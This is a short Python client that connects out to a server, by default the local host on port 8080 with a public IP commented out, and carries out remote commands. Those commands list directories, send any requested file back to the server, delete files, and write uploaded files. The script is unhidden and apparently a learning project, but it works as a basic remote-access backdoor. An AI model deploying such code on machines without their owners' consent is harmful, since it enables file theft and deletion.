import os
import socket


def pre_command():
    print("")
    print("Connected to server successfully")
    print("")


def post_command():
    print("")
    print("Command executed successfully...")
    print("")


def pwd():
    files = os.getcwd()
    files = str(files)
    # s.send("".encode())
    s.send(files.encode())
    post_command()


def custom_dir():
    try:
        user_input = s.recv(5000)
        user_input = user_input.decode()
        files = os.listdir(user_input)
        files = str(files)
        s.send(files.encode())
        post_command()
    except:
        return


def download_files():
    # FlushListen(s)
    try:
        filepath = s.recv(5000)
        filepath = filepath.decode()
        file = open(filepath, "rb")

        l = file.read(1024)
        while l:
            s.send(l)
            # print('Sent ', repr(l))
            l = file.read(1024)

        post_command()
    except:
        return


def remove_file():
    try:
        filepath = s.recv(5000)
        filepath = filepath.decode()
        os.remove(filepath)
        post_command()
    except:
        return


def send_files():
    try:
        filename = s.recv(5000)
        # print(filename)
        new_file = open(filename, "wb")
        data = s.recv(90000000)
        new_file.write(data)
        new_file.close()
    except:
        return


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 0)
port = 8080
# port = 18496
host = socket.gethostname()
# host = "3.19.130.43"
# host = input(str("Enter server address: "))
s.connect((host, port))
pre_command()


def loop():
    while True:
        command = s.recv(1024)
        command = command.decode()
        print("Command received...")
        print("")
        # print(command)

        if command == "pwd":
            pwd()

        elif command == "ls":
            custom_dir()

        elif command == "download":
            download_files()

        elif command == "remove":
            remove_file()

        elif command == "send":
            send_files()

        elif command == "exit":
            break

        else:
            print("Command not recognized")


loop()
